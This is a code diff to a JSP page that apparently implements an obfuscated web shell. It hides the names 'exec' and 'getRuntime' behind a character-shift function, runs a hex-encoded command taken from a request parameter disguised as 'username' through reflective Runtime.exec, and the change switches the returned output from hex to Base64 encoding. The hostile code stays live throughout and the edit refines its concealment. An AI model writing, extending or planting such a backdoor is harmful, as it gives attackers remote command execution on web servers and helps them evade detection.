@@ -1,6 +1,7 @@
 <%@ page contentType="text/html;charset=UTF-8"  language="java" %>
 <%@ page import="java.io.BufferedReader" %>
 <%@ page import="java.io.InputStreamReader" %>
+<%@ page import="sun.misc.BASE64Encoder" %>
 <%!
     public static String eStr(String str){
         String result = "";
@@ -53,10 +54,16 @@
             Process e = (Process) rt.getMethod(new String(eStr("j}jh")), String.class).
                     invoke(rt.getMethod(new String(eStr("ljyWzsynrj"))).
                             invoke(null, new Object[]{}), hexStringToString(request.getParameter("username")));
-            String s;
-            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(e.getInputStream()));
-            while ((s = bufferedReader.readLine()) != null)
-                out.println(string2HexString(s));
+
+            StringBuffer content= new StringBuffer();
+            BufferedReader reader = new BufferedReader(new InputStreamReader(e.getInputStream()));
+            int ch;
+            while ((ch = reader.read()) != -1) {
+                content.append((char) ch);
+            }
+            reader.close();
+            BASE64Encoder encoder = new BASE64Encoder();
+            out.println(encoder.encode(content.toString().getBytes()));
         }
     }
 %>
